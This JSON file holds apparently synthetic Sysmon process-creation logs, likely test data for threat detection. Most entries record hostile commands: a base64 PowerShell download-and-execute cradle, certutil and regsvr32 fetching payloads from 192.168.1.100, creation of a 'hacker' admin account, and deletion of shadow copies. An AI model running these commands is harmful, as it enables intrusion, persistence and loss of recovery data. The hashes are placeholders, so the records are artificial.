[
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:30:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:30:00.000",
      "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
      "ProcessId": "1234",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd.exe /c whoami > C:\\Users\\Public\\output.txt",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=5FD22C9C2D1E8A49D1234567890ABCDEF,SHA256=1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
      "ParentProcessGuid": "{ABCDEF12-3456-7890-ABCD-EF1234567890}",
      "ParentProcessId": "5678",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
      "ParentCommandLine": "OUTLOOK.EXE",
      "ParentUser": "DESKTOP-001\\User"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:31:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:31:00.000",
      "ProcessGuid": "{23456789-2345-2345-2345-234567890123}",
      "ProcessId": "2345",
      "Image": "C:\\Windows\\System32\\powershell.exe",
      "CommandLine": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=ABCDEF1234567890ABCDEF1234567890,SHA256=ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF1234567890",
      "ParentProcessGuid": "{BCDEF123-4567-8901-BCDE-F12345678901}",
      "ParentProcessId": "6789",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "ParentCommandLine": "WINWORD.EXE",
      "ParentUser": "DESKTOP-001\\User"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:32:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:32:00.000",
      "ProcessGuid": "{34567890-3456-3456-3456-345678901234}",
      "ProcessId": "3456",
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://192.168.1.100/malware.exe C:\\Users\\Public\\svchost.exe",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=1234ABCD5678EF901234ABCD5678EF90,SHA256=1234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF90",
      "ParentProcessGuid": "{CDEF1234-5678-9012-CDEF-123456789012}",
      "ParentProcessId": "7890",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
      "ParentCommandLine": "EXCEL.EXE",
      "ParentUser": "DESKTOP-001\\User"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:33:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:33:00.000",
      "ProcessGuid": "{45678901-4567-4567-4567-456789012345}",
      "ProcessId": "4567",
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd.exe /c net user hacker Password123! /add && net localgroup administrators hacker /add",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "High",
      "Hashes": "MD5=5678EF901234ABCD5678EF901234ABCD,SHA256=5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD",
      "ParentProcessGuid": "{DEF12345-6789-0123-DEF1-234567890123}",
      "ParentProcessId": "8901",
      "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      "ParentCommandLine": "chrome.exe",
      "ParentUser": "DESKTOP-001\\User"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:34:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:34:00.000",
      "ProcessGuid": "{56789012-5678-5678-5678-567890123456}",
      "ProcessId": "5678",
      "Image": "C:\\Windows\\System32\\vssadmin.exe",
      "CommandLine": "vssadmin.exe delete shadows /all /quiet",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "SYSTEM",
      "LogonGuid": "{98765432-5432-5432-5432-321098765432}",
      "LogonId": "0x3E7",
      "TerminalSessionId": "0",
      "IntegrityLevel": "System",
      "Hashes": "MD5=901234ABCD5678EF901234ABCD5678EF,SHA256=901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF",
      "ParentProcessGuid": "{EF123456-7890-1234-EF12-345678901234}",
      "ParentProcessId": "666",
      "ParentImage": "C:\\Windows\\System32\\lsass.exe",
      "ParentCommandLine": "lsass.exe",
      "ParentUser": "SYSTEM"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:35:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:35:00.000",
      "ProcessGuid": "{67890123-6789-6789-6789-678901234567}",
      "ProcessId": "6789",
      "Image": "C:\\Windows\\System32\\regsvr32.exe",
      "CommandLine": "regsvr32.exe /s /n /u /i:http://192.168.1.100/sc.sct scrobj.dll",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=ABCD5678EF901234ABCD5678EF901234,SHA256=ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234",
      "ParentProcessGuid": "{F1234567-8901-2345-F123-456789012345}",
      "ParentProcessId": "1234",
      "ParentImage": "C:\\Windows\\System32\\svchost.exe",
      "ParentCommandLine": "svchost.exe -k netsvcs",
      "ParentUser": "SYSTEM"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:36:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:36:00.000",
      "ProcessGuid": "{78901234-7890-7890-7890-789012345678}",
      "ProcessId": "7890",
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0x4",
      "CurrentDirectory": "C:\\Windows\\System32\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=CDEF901234ABCD5678EF901234ABCD56,SHA256=CDEF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD56",
      "ParentProcessGuid": "{01234567-8901-2345-0123-456789012345}",
      "ParentProcessId": "456",
      "ParentImage": "C:\\Windows\\System32\\services.exe",
      "ParentCommandLine": "services.exe",
      "ParentUser": "SYSTEM"
    }
  },
  {
    "EventID": 1,
    "TimeCreated": "2024-01-15T10:37:00.000Z",
    "Computer": "WORKSTATION-001",
    "EventData": {
      "UtcTime": "2024-01-15 10:37:00.000",
      "ProcessGuid": "{89012345-8901-8901-8901-890123456789}",
      "ProcessId": "8901",
      "Image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "CurrentDirectory": "C:\\Program Files\\Google\\Chrome\\Application\\",
      "User": "DESKTOP-001\\User",
      "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
      "LogonId": "0x12345678",
      "TerminalSessionId": "1",
      "IntegrityLevel": "Medium",
      "Hashes": "MD5=EF901234ABCD5678EF901234ABCD5678,SHA256=EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678EF901234ABCD5678",
      "ParentProcessGuid": "{12345678-9012-3456-1234-567890123456}",
      "ParentProcessId": "4321",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "ParentUser": "DESKTOP-001\\User"
    }
  }
]